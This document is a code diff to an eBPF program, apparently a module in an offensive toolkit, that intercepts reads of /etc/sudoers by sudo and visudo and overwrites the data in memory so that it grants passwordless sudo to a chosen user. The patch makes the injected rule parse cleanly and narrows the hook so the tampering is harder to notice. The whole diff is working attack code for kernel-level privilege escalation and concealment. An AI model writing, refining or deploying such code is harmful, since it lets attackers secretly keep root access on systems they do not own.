@@ -12,7 +12,7 @@ char _metadata[] __attribute__((used, section(".metadata"))) =
       "\"desc\":\"Kernel Privilege Hijacking: Dynamically tampers with the sudoers read stream to grant passwordless sudo privileges to the target user.\","
       "\"requires\":[\"is_root\",\"tracefs\",\"probe_write\"],"
       "\"options\":{"
-        "\"target\":[\"\\nroot ALL=(ALL:ALL) NOPASSWD:ALL\\n\",\"The rule to inject into sudoers (can contain multiple lines/users)\"]"
+        "\"target\":[\"root\",\"The user to grant sudo privileges to (or full custom rule)\"]"
       "},"
       "\"maps\":{"
         "\"target\":{\"key_size\":4,\"value_size\":64,\"key_type\":\"u32\",\"value_type\":\"str\"}"
@@ -57,9 +57,17 @@ int handle_openat_enter(struct trace_event_raw_sys_enter *ctx) {
     if (fname[0]=='/' && fname[1]=='e' && fname[2]=='t' && fname[3]=='c' &&
         fname[4]=='/' && fname[5]=='s' && fname[6]=='u' && fname[7]=='d' &&
         fname[8]=='o' && fname[9]=='e' && fname[10]=='r' && fname[11]=='s') {
-        u64 id = bpf_get_current_pid_tgid();
-        u32 mark = 1;
-        bpf_map_update_elem(&active_sudoers_fd, &id, &mark, BPF_ANY);
+        
+        char comm[16];
+        bpf_get_current_comm(&comm, sizeof(comm));
+        
+        // Only hijack if the process reading the file is sudo (or visudo)
+        if ((comm[0] == 's' && comm[1] == 'u' && comm[2] == 'd' && comm[3] == 'o' && comm[4] == '\0') ||
+            (comm[0] == 'v' && comm[1] == 'i' && comm[2] == 's' && comm[3] == 'u' && comm[4] == 'd' && comm[5] == 'o' && comm[6] == '\0')) {
+            u64 id = bpf_get_current_pid_tgid();
+            u32 mark = 1;
+            bpf_map_update_elem(&active_sudoers_fd, &id, &mark, BPF_ANY);
+        }
     }
     return 0;
 }
@@ -100,8 +108,34 @@ int handle_read_exit(struct trace_event_raw_sys_exit *ctx) {
     if (ctx->ret > 64) {
         u32 key = 0;
         char *payload = bpf_map_lookup_elem(&target, &key);
-        if (payload)
-            bpf_probe_write_user(*buf_ptr, payload, 64);
+        if (payload) {
+            char safe_payload[64];
+            bpf_probe_read_kernel(&safe_payload, sizeof(safe_payload), payload);
+            
+            int found_null = 0;
+            #pragma unroll
+            for (int i = 0; i < 64; i++) {
+                if (safe_payload[i] == '\0') {
+                    if (!found_null) {
+                        safe_payload[i] = '#'; // End payload and start comment
+                        found_null = 1;
+                    } else {
+                        safe_payload[i] = ' '; // Pad with space
+                    }
+                }
+            }
+            bpf_probe_write_user(*buf_ptr, safe_payload, 64);
+        }
+    }
+    return 0;
+}
+
+SEC("tp/syscalls/sys_enter_close")
+int handle_close_enter(struct trace_event_raw_sys_enter *ctx) {
+    u64 id = bpf_get_current_pid_tgid();
+    u32 *sudo_fd = bpf_map_lookup_elem(&active_sudoers_fd, &id);
+    if (sudo_fd && (u32)ctx->args[0] == *sudo_fd) {
+        bpf_map_delete_elem(&active_sudoers_fd, &id);
     }
     return 0;
 }
